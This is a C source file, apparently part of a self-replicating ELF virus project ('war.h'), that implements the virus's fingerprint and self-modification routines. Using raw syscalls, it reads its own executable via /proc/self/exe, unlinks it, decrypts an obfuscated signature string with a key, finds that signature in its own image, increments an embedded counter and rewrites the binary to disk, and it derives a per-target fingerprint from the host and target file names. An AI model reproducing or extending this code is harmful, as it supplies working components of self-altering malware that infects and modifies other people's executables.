#include "war.h"

#define FNV_OFFSET_BASIS_64 0xcbf29ce484222325
#define FNV_PRIME_64 0x00000100000001b3

uint64_t fnv1a_64(const void *data, size_t len) {
	uint64_t hash = FNV_OFFSET_BASIS_64;
	for (size_t i = 0; i < len; i++) {
		hash ^= ((uint8_t *)data)[i];
		hash *= FNV_PRIME_64;
	}
	return hash;
}

void hash_to_printable(uint64_t hash, char *fingerprint) {
	for (size_t i = 0; i < 8; i++) {
		fingerprint[i] = (hash % 95) + 32;
		hash /= 95;
	}
}

void update_fingerprint(char *fingerprint, t_data *data) {
	uint64_t hash = fnv1a_64(data->self_name, ft_strlen(data->self_name));
	hash ^= fnv1a_64(data->target_name, ft_strlen(data->target_name));
	hash_to_printable(hash, fingerprint);
}

void increment_counter(char *counter) {
	for (int i = 3; i >= 0; i--) {
		if (counter[i] == '9') {
			counter[i] = '0';
		} else {
			counter[i] += 1;
			break;
		}
	}
}

int self_fingerprint(const char *self_name, size_t increment) {

	struct stat st;
	int fd = _syscall(SYS_open, self_name, O_RDONLY);

	if (fd == -1) {
		return -1;
	}

	if (_syscall(SYS_fstat, fd, &st) == -1) {
		_syscall(SYS_close, fd);
		return -1;
	}

	uint8_t *self = (uint8_t *)_syscall(SYS_mmap, 0, st.st_size, PROT_READ | PROT_WRITE, MAP_PRIVATE | MAP_ANONYMOUS, -1, 0);
	if (self == MAP_FAILED) {
		_syscall(SYS_close, fd);
		return -1;
	}

	uint8_t *ptr = self;
	char buf[4096];

	while (1) {
		ssize_t ret = _syscall(SYS_read, fd, buf, 4096);
		if (ret == -1) {
			_syscall(SYS_close, fd);
			_syscall(SYS_munmap, self, st.st_size);
			return -1;
		}
		else if (ret == 0)
			break;
		ft_memcpy(ptr, buf, ret);
		ptr += ret;
	}

	_syscall(SYS_close, fd);
	_syscall(SYS_unlink, self_name);

	char signature[26] = "\x53\x1d\x27\x16\xd7\x1c\x17\xb6\x76\x55\x25\x1b\xdc\x1d\x17\xfc\x6c\x5c\x2e\x07\xcb\x01\x55\xe6\x7e\x00";

	encrypt((uint8_t *)signature, sizeof(signature) - 1, DEFAULT_KEY);

	char *found = ft_memmem(self, st.st_size, signature, ft_strlen(signature));

	char *counter = found + 37;

	while (increment--) {
		increment_counter(counter);
	}

	fd = _syscall(SYS_open, self_name, O_CREAT | O_WRONLY | O_TRUNC, st.st_mode);
	if (fd == -1)
		return -1;

	_syscall(SYS_write, fd, self, st.st_size);

	_syscall(SYS_munmap, self, st.st_size);

	_syscall(SYS_close, fd);


	return 0;
}

int self_name(char *self_name) {
	char buf[PATH_MAX];
	char proc_self_exe[] = "/proc/self/exe";

	int ret = _syscall(SYS_readlink, proc_self_exe, buf, PATH_MAX);
	if (ret == -1) {
		return -1;
	}
	buf[ret] = '\0';

	ft_strlcpy(self_name, buf, PATH_MAX);

	return 0;
}
